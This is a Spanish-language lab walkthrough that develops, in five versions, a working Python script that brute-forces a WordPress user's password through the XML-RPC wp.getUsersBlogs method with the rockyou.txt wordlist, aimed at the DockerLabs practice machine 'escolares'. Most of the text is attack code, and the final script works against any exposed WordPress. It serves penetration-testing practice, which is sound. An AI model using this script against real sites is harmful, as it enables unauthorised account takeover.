
## 1. **Lectura del Diccionario de Contraseñas**

**Código inicial:**

```python
import requests
import signal

url = 'http://escolares.dl/wordpress/wp-login.php'
usuario = 'luisillo'
contraseña = 'rockyou.txt'

with open(contraseña, 'r', encoding='latin-1') as diccionario:
    passwords = diccionario.readlines()

print(passwords)
```

### **Qué ocurre en este fragmento:**

- **Importación de módulos:** Se importan `requests` para realizar solicitudes HTTP y `signal` para manejar interrupciones.
    
- **Definición de variables:** Se definen la URL del login, el nombre de usuario y la ruta del diccionario de contraseñas (`rockyou.txt`).
    
- **Lectura del archivo:** Se abre el archivo de contraseñas con codificación `latin-1` y se lee todas las líneas, almacenándolas en la variable `passwords`.
    
- **Visualización:** Se imprime la lista completa de contraseñas (lo que permite verificar que se ha leído correctamente el archivo).
    

---

## 2. **Verificación del Tipo de Variable**

**Código modificado:**

```python
import requests
import signal

url = 'http://escolares.dl/wordpress/wp-login.php'
usuario = 'luisillo'
contraseña = 'rockyou.txt'

with open(contraseña, 'r', encoding='latin-1') as diccionario:
    passwords = diccionario.readlines()
    # print(passwords)

print(type(passwords))
```

### **Cambios y objetivos:**

- Se comenta la impresión completa de la lista para evitar demasiada salida.
    
- Se imprime el **tipo** de `passwords` para confirmar que efectivamente es una lista. Esto ayuda a entender la estructura de datos con la que se va a trabajar en los siguientes pasos.
    

---

## 3. **Primer Intento de Brute-Force**

**Código con bucle y prueba de contraseñas:**

```python
import requests
import signal

url = 'http://escolares.dl/wordpress/wp-login.php'
usuario = 'luisillo'
contraseña = 'rockyou.txt'

with open(contraseña, 'r', encoding='latin-1') as diccionario:
    passwords = diccionario.readlines()

for password in passwords:
    password = password.strip()  # Elimina espacios y saltos de línea

    payload = """
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{usuario}</value></param>
<param><value>{password}</value></param>
</params>
</methodCall>
"""

    print(f"Probamos con la contraseña {password}")
    
    respuesta = requests.post(url, data=payload)
    
    if 'incorrectos' not in respuesta.text:
        print(f"La contraseña del usuario luisillo es {password}")
        exit()
```

### **Qué se añade y modifica:**

- **Bucle for:** Se itera sobre cada contraseña en la lista.
    
- **Eliminación de espacios:** Se utiliza `.strip()` para limpiar cada línea.
    
- **Construcción del payload:** Se crea una cadena XML que se enviará en la solicitud POST para probar la contraseña.  
    _Nota:_ En este primer intento, el `payload` se define como una cadena multilínea sin interpolación directa, lo que puede generar problemas al no insertar los valores reales de `usuario` y `password`.
    
- **Envío de solicitud:** Se envía una solicitud POST a la URL con el XML generado.
    
- **Verificación de respuesta:** Si el texto de la respuesta no contiene la palabra "incorrectos", se asume que se encontró la contraseña correcta y se muestra un mensaje, finalizando la ejecución con `exit()`.
    

---

## 4. **Corrección del Payload con Formateo de Cadenas**

**Código corregido con f-string:**

```python
import requests
import signal

url = 'http://escolares.dl/wordpress/wp-login.php'
usuario = 'luisillo'
contraseña = 'rockyou.txt'

with open(contraseña, 'r', encoding='latin-1') as diccionario:
    passwords = diccionario.readlines()

for password in passwords:
    password = password.strip()

    payload = f"""
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{usuario}</value></param>
<param><value>{password}</value></param>
</params>
</methodCall>
"""

    print(f"Probamos con la contraseña {password}")

    respuesta = requests.post(url, data=payload)

    if 'incorrectos' not in respuesta.text:
        print(f"La contraseña del usuario luisillo es {password}")
        exit()
```

### **Mejoras realizadas:**

- **Uso de f-string:** Se reemplaza el payload por una cadena formateada (f-string) para insertar directamente las variables `usuario` y `password`.
    
- **Inclusión de la cabecera XML:** Se añade la declaración XML para asegurar que el payload tenga el formato correcto.
    
- **Corrección en la verificación de la respuesta:** Se busca que la condición de error ("incorrectos") se adapte al mensaje devuelto por el sistema. En algunos intentos, se varía la cadena a buscar, por ejemplo, `'incorrectos.'`.
    

---

## 5. **Ajuste Final y Validación de la URL**

En uno de los cambios se actualiza la URL apuntando directamente al endpoint `xmlrpc.php` en lugar de `wp-login.php`. Esto es importante ya que el método `wp.getUsersBlogs` se ejecuta a través de XML-RPC y no en la página de login normal.

**Código final con retoques y manejo de señales:**

```python
import requests
import signal

def salir(sig, frame):
    exit()

signal.signal(signal.SIGINT, salir)

url = 'http://172.17.0.2/wordpress/xmlrpc.php'
usuario = 'luisillo'
contraseña = 'rockyou.txt'

with open(contraseña, 'r', encoding='latin-1') as diccionario:
    passwords = diccionario.readlines()

for password in passwords:
    password = password.strip()

    payload = f"""
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{usuario}</value></param>
<param><value>{password}</value></param>
</params>
</methodCall>
"""

    print(f"Probamos con la contraseña {password}")

    respuesta = requests.post(url, data=payload)

    if 'incorrectos.' not in respuesta.text:
        print(f"La contraseña del usuario {usuario} es {password}")
        exit(0)
```

### **Explicación de los cambios adicionales:**

- **Manejo de Señales:**  
    Se define la función `salir` y se utiliza `signal.signal(signal.SIGINT, salir)` para permitir que, al presionar CTRL+C, se salga de la ejecución de forma controlada. Esto es útil cuando el proceso de brute-force es largo o se desea detenerlo manualmente.
    
- **Actualización de la URL:**  
    La URL se actualiza a `http://172.17.0.2/wordpress/xmlrpc.php`, apuntando correctamente al endpoint XML-RPC de WordPress, donde se espera que se procese el método `wp.getUsersBlogs`.
    
- **Verificación de Respuesta Ajustada:**  
    La condición para detectar una respuesta de contraseña incorrecta se ajusta a buscar la cadena `'incorrectos.'` en lugar de simplemente `'incorrectos'`, dependiendo de cómo se formatea el mensaje de error en la respuesta del servidor.
    
- **Finalización del Script:**  
    Se utiliza `exit(0)` para terminar el programa de manera exitosa en el momento en que se encuentre la contraseña correcta.
    

---

## 6. **Contexto de la Máquina Vulnerable**

**Pasos de despliegue y configuración en la máquina "escolares":**

1. **Descarga y descompresión:**
    
    - Se descarga el archivo `escolares.zip` y se descomprime:
        
        ```bash
        unzip escolares.zip -d ~/Escritorio/escolares
        ```
        
2. **Archivos obtenidos:**
    
    - `auto_deploy.sh`
        
    - `strongjenkins.tar`
        
3. **Despliegue de la máquina vulnerable:**
    
    - Se ejecuta el script:
        
        ```bash
        sudo bash auto_deploy.sh strongjenkins.tar
        ```
        
    - Esto despliega la máquina, asignándole una IP (por ejemplo, `172.17.0.2`).
        
4. **Acceso a WordPress:**
    
    - Se accede desde el navegador a:
        
        ```
        http://172.17.0.2/
        ```
        
    - En caso de problemas de resolución, se edita el archivo `/etc/hosts`:
        
        ```bash
        sudo nano /etc/hosts
        ```
        
        Añadiendo:
        
        ```
        172.17.0.2    escolares.dl
        ```
        
    - Finalmente, se accede a la ruta:
        
        ```
        http://172.17.0.2/wordpress
        ```
        

Con estos pasos se configura y se accede a la máquina vulnerable, permitiendo la ejecución del script de brute-force contra el endpoint XML-RPC de WordPress.

---

## **Resumen Final**

La evolución del código fue la siguiente:

1. **Lectura y verificación del diccionario de contraseñas:**  
    Se aseguró que el archivo `rockyou.txt` se leía correctamente y se comprobó el tipo de dato.
    
2. **Creación del bucle de brute-force:**  
    Se agregó el bucle `for` para iterar sobre cada contraseña, limpiando cada línea y construyendo el payload XML.
    
3. **Corrección del formato del payload:**  
    Se utilizó la interpolación de cadenas (f-string) para insertar las variables `usuario` y `password` en el XML, además de añadir la cabecera XML.
    
4. **Ajuste en la verificación de la respuesta:**  
    Se modificó la comprobación del contenido de la respuesta para determinar si la contraseña es incorrecta o correcta.
    
5. **Actualización del endpoint y manejo de interrupciones:**  
    Se cambió la URL para apuntar al XML-RPC de WordPress y se implementó el manejo de la señal SIGINT para salir de forma controlada.
    

Este desarrollo gradual permitió transformar un script inicial de lectura de contraseñas en un brute-force funcional y robusto, ajustado al entorno de la máquina vulnerable **"escolares"** de DockerLabs.

